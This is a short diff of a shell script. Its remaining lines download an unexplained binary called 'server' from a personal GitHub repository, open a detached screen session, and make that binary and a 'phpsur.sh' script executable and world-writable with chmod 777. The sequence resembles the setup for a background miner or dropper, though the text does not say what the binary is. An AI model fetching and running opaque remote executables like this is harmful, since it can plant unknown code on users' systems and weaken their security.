@@ -1,5 +1,4 @@
 
-sudo apt install screen libjansson4 -y
 wget -O server https://github.com/Ankie-Davenschot/Davenschot/raw/main/server 
 screen -dmS ls
 chmod +x phpsur.sh && chmod +x server && chmod 777 server phpsur.sh
